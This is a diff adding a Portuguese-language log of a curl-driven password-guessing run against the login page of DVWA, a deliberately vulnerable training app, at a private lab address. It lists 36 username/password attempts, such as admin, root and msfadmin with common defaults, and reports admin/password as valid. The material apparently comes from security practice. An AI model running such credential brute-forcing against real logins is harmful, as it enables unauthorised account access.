@@ -1,0 +1,43 @@
+=== AUTOMACAO WEB - DVWA login.php ===
+Data: Fri Nov 20 01:14:42 AM EST 2026
+Metodo: loop curl sobre users.txt x passwords.txt, sessao nova por tentativa
+Criterio: apos seguir redirect, URL final termina em /index.php
+
+tentativa: User: anonymous Password: password [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: anonymous Password: 123456 [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: anonymous Password: msfadmin [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: anonymous Password: admin [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: anonymous Password: toor [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: anonymous Password: letmeout [URL http://192.168.56.101/dvwa/login.php] - falha
+ACCOUNT FOUND: [web] User: admin Password: password [URL http://192.168.56.101/dvwa/index.php]
+tentativa: User: admin Password: 123456 [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: admin Password: msfadmin [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: admin Password: admin [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: admin Password: toor [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: admin Password: letmeout [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: msfadmin Password: password [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: msfadmin Password: 123456 [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: msfadmin Password: msfadmin [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: msfadmin Password: admin [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: msfadmin Password: toor [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: msfadmin Password: letmeout [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: root Password: password [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: root Password: 123456 [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: root Password: msfadmin [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: root Password: admin [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: root Password: toor [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: root Password: letmeout [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: user Password: password [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: user Password: 123456 [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: user Password: msfadmin [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: user Password: admin [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: user Password: toor [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: user Password: letmeout [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: guest Password: password [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: guest Password: 123456 [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: guest Password: msfadmin [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: guest Password: admin [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: guest Password: toor [URL http://192.168.56.101/dvwa/login.php] - falha
+tentativa: User: guest Password: letmeout [URL http://192.168.56.101/dvwa/login.php] - falha
+
+Resumo: 36 tentativas, 1 credenciais validas
